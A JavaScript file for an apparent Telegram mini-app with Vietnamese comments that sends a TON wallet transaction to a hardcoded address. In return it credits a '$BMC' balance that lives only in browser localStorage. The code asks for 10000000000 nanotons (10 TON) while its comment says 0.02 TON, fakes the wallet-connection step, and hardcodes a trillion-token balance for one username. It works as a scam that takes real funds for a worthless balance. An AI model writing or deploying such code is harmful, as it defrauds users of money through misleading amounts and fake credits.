// Lấy số dư BMC từ localStorage hoặc mặc định là 0
let balance = localStorage.getItem('bmcBalance') ? parseInt(localStorage.getItem('bmcBalance')) : 0;

// Hiển thị số dư trên trang
const balanceElement = document.getElementById('balance');
balanceElement.textContent = `${balance} $BMC `;

// Gọi hàm kết nối khi tải trang
connectToWallet();

// Payload giao dịch
const transaction = {
    valid_until: Math.floor(Date.now() / 1000) + 3600, // Expiration time (1 hour)
    messages: [
        {
            address: "UQDu8vyZSZbAYvRRQ_jW4_0EiBGibAGq72wSZjYWRmNAGhRD-0FR2TNRO3i3a9asbsXy", // Thay thế bằng địa chỉ đích
            amount: "10000000000" // 0.02 TON in nanotons
        }
    ]
};

// Xử lý gửi giao dịch
document.getElementById('send-now').addEventListener('click', async () => {
    try {
        // Disable button và thay đổi trạng thái thành Sending...
        const sendNowBtn = document.getElementById('send-now');
        sendNowBtn.disabled = true;
        sendNowBtn.innerHTML = '<div class="spinner"></div><span> Sending...</span>';

        // Gửi giao dịch
        await tonConnectUI.sendTransaction(transaction);

        // Nếu giao dịch thành công, cập nhật trạng thái và cộng 1000 BMC
        sendNowBtn.innerHTML = '<span>Done</span>';
        sendNowBtn.disabled = true;

        // Cộng 1000 BMC
        balance += 1000;

        // Lưu số dư mới vào localStorage
        localStorage.setItem('bmcBalance', balance);

        // Cập nhật hiển thị số dư trên trang
        balanceElement.textContent = `${balance} $BMC`;

        console.log("Transaction sent successfully:", transaction);
    } catch (error) {
        console.error("Error sending message:", error);
        const sendNowBtn = document.getElementById('send-now');
        sendNowBtn.innerHTML = '<span>Trade again</span>';
        sendNowBtn.disabled = false; // Cho phép người dùng gửi lại giao dịch nếu có lỗi
    }
});

// Hàm giả lập connectToWallet (cần thay bằng hàm kết nối thực tế)
function connectToWallet() {
    console.log("Đã kết nối ví thành công!");
}

// Kiểm tra và lấy thông tin từ Telegram WebApp API
window.addEventListener('load', () => {
    if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe) {
        let user = Telegram.WebApp.initDataUnsafe.user;

        if (user) {
            let userName = user.first_name + " " + (user.last_name || "");
            let username = user.username || "No Username"; // Thay thế nếu không có username

            // Cập nhật thông tin vào HTML
            document.getElementById('user-name').textContent = userName;
            document.getElementById('user-username').textContent = `@${username}`;

            // Nếu user-username là BmassK3, đặt số dư BMC là 1.000.000.000.000
            if (username === 'BmassK3') {
                balance = 1000000000000;
                localStorage.setItem('bmcBalance', balance);
                balanceElement.textContent = `${balance} $BMC`;
                console.log('User là BmassK3, số dư BMC đã được đặt thành 1.000.000.000.000');
            }

        } else {
            console.log("Không có thông tin người dùng.");
        }
    } else {
        console.error("Telegram WebApp API không khả dụng hoặc không có thông tin người dùng.");
    }
});
